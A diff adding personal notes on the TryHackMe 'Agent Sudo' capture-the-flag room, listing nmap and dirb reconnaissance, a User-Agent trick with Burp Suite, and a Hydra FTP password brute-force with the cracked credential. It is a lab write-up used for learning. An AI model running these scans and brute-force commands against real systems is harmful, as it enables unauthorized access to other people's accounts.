@@ -1,0 +1,67 @@
+All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf :
+
+1 - PortScaning
+
+    nmap -sV 10.10.86.210
+
+    PORT     STATE    SERVICE  VERSION
+    21/tcp   open     ftp      vsftpd 3.0.3
+    22/tcp   open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))
+    3005/tcp filtered deslogin
+
+
+2 - List paths and directories with Dirb
+
+    dirb http://10.10.86.210/ 
+
+3 - When access the base path http://10.10.86.210/ , returns:
+
+    Dear agents,
+
+    Use your own codename as user-agent to access the site.
+
+    From,
+    Agent R
+
+4 - The third hint says :
+
+    You might face problem on using Firefox. Try 'user agent switcher' plugin with user agent: C
+
+5 - We can switch the user-agent value of request with BurbSuite intercepting it 
+
+    When edited 'User-agent: C' , returns on secret path file to be acess agent_C_attention.php
+
+6 - The http://10.10.86.210/agent_C_attention.php returns:
+
+    Attention chris,
+
+    Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+    From,
+    Agent R
+
+7 - 'chris' is one answer/flag
+
+8 - With user 'chris' , we can force brutal attack using Hydra 
+
+    hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.86.210 ftp
+
+    There is one match:
+
+    [21][ftp] host: 10.10.86.210   login: chris   password: crystal
+
+9 - With user and password of ftp, lets connect
+
+    ftp chris@10.10.86.210 -p 21
+
+
+10.10.86.210
+
+Concepts:
+#PortScaning
+#Dirb
+#BurbSuite
+#Hydra
+
+https://infosecwriteups.com/agent-sudo-walkthrough-tryhackme-d0abf6f2c6a1
